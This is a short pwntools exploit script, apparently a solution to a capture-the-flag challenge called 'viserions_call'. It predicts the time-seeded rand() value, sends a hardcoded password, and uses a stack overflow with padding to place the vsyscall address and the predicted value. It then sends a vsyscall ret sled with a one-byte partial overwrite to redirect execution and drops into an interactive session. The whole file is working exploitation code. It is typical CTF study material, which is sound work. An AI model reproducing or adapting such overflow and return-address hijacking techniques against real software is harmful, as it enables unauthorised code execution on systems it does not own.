from pwn import *
from ctypes import CDLL

if __name__=="__main__":
	context.log_level="debug"
	
	p = process('./viserions_call', env={"LD_PRELOAD" : "./libc.so.6"})
	#p = remote('gc1.eng.run', 31459)
	libc = CDLL("libc.so.6")
	libc.srand(int(time.time()) & 0xffffff00)
	rand_val = libc.rand()

	gdb.attach(p, gdbscript='''b*main+95\n''')
	
	info("rand : %s"%rand_val)
	
	p.recvuntil('Name:\n')
	p.sendline(b'abcd')
	
	p.recvuntil('Password:\n')

	pay = b's3cur3_p4ssw0rd\x00'
	pay += b'\x00'*(0x1c - 8 - len(pay))
	pay += p64(0xffffffffff600000)
	pay += p64(rand_val)

	p.send(pay)

	ret_addr = 0xffffffffff600000
	pay = p64(ret_addr)*27+'\xdf'

	p.send(pay)
	s = p.recv()
	print(s)
p.interactive()
p.close()
